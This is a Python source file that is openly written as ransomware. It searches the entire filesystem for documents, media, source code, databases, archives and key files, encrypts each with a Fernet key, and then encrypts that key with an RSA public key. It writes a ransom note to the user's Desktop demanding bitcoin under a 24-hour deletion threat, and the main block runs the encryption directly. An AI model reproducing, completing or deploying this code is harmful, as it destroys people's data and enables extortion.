import os, subprocess, shutil 
from pathlib import Path
from cryptography.fernet import Fernet
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
# For socket
host = "192.168.1.74"
port = 1234

random_key = Fernet.generate_key()
root = os.path.expanduser('~')
directory = os.getcwd()

EXCLUDE_DIRECTORY = (   '/usr', #Mac/Linux system directory
                        '/Library/',
                        '/System',
                        '/Applications',
                        '.Trash',
                        #Windows system directory
                        'Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                            
                        'logs',

                        )

EXTENSIONS = (
        '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', 
        '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', 
        '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', 

        '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', 
        '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', 
        '.yml', '.yaml', '.json', '.xml', '.csv', 
        '.db', '.sql', '.dbf', '.mdb', '.iso', 
        
        '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', 
        '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', 
        '.java', '.class', '.jar', 
        '.ps', '.bat', '.vb', '.vbs' 
        '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', 
        '.go', '.py', '.pyc', '.bf', '.coffee', 

        '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  
        '.pem',
        )
        
def search_files():
    f = open("logs/path.txt", "w")
    cnt = 0
    for root, dirs, files in os.walk("/"): # If you want encrypt all the commputer
    # for root, dirs, files in os.walk("test_file/"): # for test | it's a security
        if any(s in root for s in EXCLUDE_DIRECTORY):
            pass
        else:
            for file in files:
                 if file.endswith(EXTENSIONS):
                    target = os.path.join(root, file)
                    f.write(target+'\n')
                    print(root)

    f.close()

def enc_fernet_key():
    with open("public.key", "rb") as f:
        rf = f.read()
        pubkey = RSA.import_key(rf)

    # crypt key
    cipher_rsa = PKCS1_OAEP.new(pubkey)
    enc_key = cipher_rsa.encrypt(random_key)
    with open("logs/fernet_key.txt","wb") as f:
        f.write(enc_key)

def crypt_files(file_path, key):
    f = Fernet(key)
    # print(key)
    with open(file_path, "rb") as fp:
        fdata = fp.read()
    encryptdat = f.encrypt(fdata)

    with open(file_path, "wb") as file:
        file.write(encryptdat)
    print(file_path)

def decrypt(file_path, key):
    f = Fernet(key)
    with open(file_path, "rb") as fp:
        fdata = fp.read()
    decryptdat = f.decrypt(fdata)

    with open(file_path, "wb") as file:
        file.write(decryptdat)
    print(file_path)

def copy_file_desktop():
    hdyd = f'''


        $$$$$$$$\ $$$$$$\ $$\   $$\ $$\   $$\ $$\     $$\ 
        $$  _____|\_$$  _|$$ |  $$ |$$ |  $$ |\$$\   $$  |
        $$ |        $$ |  \$$\ $$  |\$$\ $$  | \$$\ $$  / 
        $$$$$\      $$ |   \$$$$  /  \$$$$  /   \$$$$  /  
        $$  __|     $$ |   $$  $$<   $$  $$<     \$$  /   
        $$ |        $$ |  $$  /\$$\ $$  /\$$\     $$ |    
        $$ |      $$$$$$\ $$ /  $$ |$$ /  $$ |    $$ |    
        \__|      \______|\__|  \__|\__|  \__|    \__|    
                                                  
                                                  
                                                

HELLO, ALL YOUR IMPORTANT FILES HAVE BEEN ENCRYPTED WITH A UNIQUE KEY.
Don't be afraid, to decrypt your data you just have to pay a ransom.
This ransom is only $50 and they must be sent in bitcoin to this address 
=> <BITCOIN_ADDRESS>. Here are the step by step instructions to recover your 
data in good health ;) :


/!\ WARNING: YOUR DATA WILL BE DELETED WITHIN 24 HOURS IF THES INSTRUCTIONS 
ARE NOT FOLLOWED!


1* Pay the ransom to this bitcoin address: <BITCOIN_ADDRESS>.

2* Send a proof of your payment and the file "fernet_key.txt" located here => 
"{directory}/logs/fernet_key.txt" to this e-mail.

3* Delete the file "fernet_key.txt", I will send you a new one which must be located 
exactly at the same place as the previous one.

4* To finish, just run "decrypt_your_computer.exe" located here 
=> "{directory}/decrypt/decrypt_your_computer.exe"
    '''
    with open("HOW-DECRYPT-YOUR-DATA.txt", "w") as f:
        f.write(hdyd)
    shutil.copy("HOW-DECRYPT-YOUR-DATA.txt", root+"/Desktop")
    subprocess.Popen(["notepad.exe", f"{root}/Desktop/HOW-DECRYPT-YOUR-DATA.txt"])

def ransomware():
    search_files()
    with open("logs/path.txt", "rb") as f:
        file_line = f.readline()
        while file_line:
            filename = file_line.strip()
            try:
                crypt_files(filename, random_key)
            except Exception:
                print("Accès refusé!\nPermission trop faible.")
            file_line = f.readline()
    f.close()

def decrypt_computer(self):
    key = self.entry1.get()
    with open("logs/path.txt", "rb") as f:
        file_line = f.readline()
        while file_line:
            filename = file_line.strip()
            try:
                decrypt(filename, random_key)
            except Exception:
                print("Accès refusé!\nPermission trop faible.")
            file_line = f.readline()
    f.close()

if __name__ == "__main__":
    ransomware()
    enc_fernet_key()
    copy_file_desktop()